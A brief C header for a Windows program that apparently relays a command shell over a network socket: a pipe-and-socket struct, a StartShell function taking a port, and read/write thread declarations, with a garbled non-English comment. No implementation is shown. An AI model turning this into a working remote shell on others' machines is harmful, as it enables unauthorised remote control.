#pragma once
#include <WinSock2.h>
#include <tchar.h>
#include <strsafe.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

typedef struct tag_PIPE_NODE
{
	HANDLE hPipe;
	SOCKET Socket;
}PIPE_NONE ,*LPPIPE_NODE;

extern BOOL g_bExit; //ÊÇ·ñÍÆ³ö
BOOL StartShell(unsigned short uPort);
BOOL SocketInit();
DWORD WINAPI ThreadReadProc(LPVOID lpParameter);
DWORD WINAPI ThreadWriteProc(LPVOID lpParameter);

#define MAX_BUFFER_LENGTH 4096
